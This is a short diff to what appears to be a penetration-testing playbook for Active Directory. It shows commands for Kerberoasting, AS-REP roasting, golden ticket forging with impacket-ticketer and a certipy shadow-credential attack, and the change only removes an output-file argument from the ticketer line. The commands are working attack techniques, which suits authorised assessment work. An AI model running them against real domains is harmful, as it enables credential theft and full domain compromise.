@@ -167,7 +167,7 @@ Beyond the ticket-form checks in step 3, map the specific Kerberos abuse primiti
 ```bash
 run_tool impacket-GetUserSPNs DOMAIN/USER:PASS@DC -outputfile "$DIR/scans/kerberoast.txt"
 run_tool impacket-GetNPUsers DOMAIN/ -usersfile "$DIR/scans/candidate-users.txt" -outputfile "$DIR/scans/asrep.txt" -no-pass
-run_tool impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN USER -outputfile "$DIR/scans/golden.ccache" # record only; requires krbtgt hash from an already-owned DC
+run_tool impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN USER # record only; requires krbtgt hash from an already-owned DC
 run_tool certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_ACCOUNT # msDS-KeyCredentialLink write-based shadow credential
 ```
 
